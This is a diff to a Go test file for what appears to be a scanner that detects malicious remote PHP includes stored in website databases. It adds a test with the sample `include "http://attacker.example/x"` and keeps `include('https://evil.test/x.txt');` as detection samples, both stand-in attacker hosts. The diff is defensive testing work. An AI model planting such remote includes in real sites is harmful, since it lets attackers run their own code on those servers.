@@ -128,6 +128,22 @@ func TestAPostThatWritesAboutPHPIsNotAFinding(t *testing.T) {
 	}
 }
 
+// DB.Include.Remote must require a real host after the scheme, so a stored value
+// that merely writes about includes ("do not include \"http://\" links") is not
+// a match, while a real stored remote include still is.
+func TestDatabaseRemoteIncludeIgnoresEmptyURL(t *testing.T) {
+	fires := func(value string) bool {
+		_, _, names, _ := verdict(evaluateDatabaseValue(value), 0)
+		return slices.Contains(names, "DB.Include.Remote")
+	}
+	if fires(`do not include "http://" links in your content`) {
+		t.Error("DB.Include.Remote fired on a quoted empty URL")
+	}
+	if !fires(`include "http://attacker.example/x"`) {
+		t.Error("DB.Include.Remote missed a real stored remote include")
+	}
+}
+
 // The other direction. Without this the narrowing could be taken as far as
 // reporting nothing at all and every check above would still pass.
 func TestARealInjectionIntoAPostIsStillCritical(t *testing.T) {
@@ -230,14 +246,7 @@ func TestEveryDatabaseRuleMatchesSomething(t *testing.T) {
 		`include('https://evil.test/x.txt');`,
 	}
 	for _, r := range dbHeuristics {
-		fired := false
-		for _, sample := range samples {
-			if r.re.MatchString(sample) {
-				fired = true
-				break
-			}
-		}
-		if !fired {
+		if !slices.ContainsFunc(samples, r.re.MatchString) {
 			t.Errorf("%s matches none of the samples, so it is a pattern nobody has seen fire", r.name)
 		}
 	}
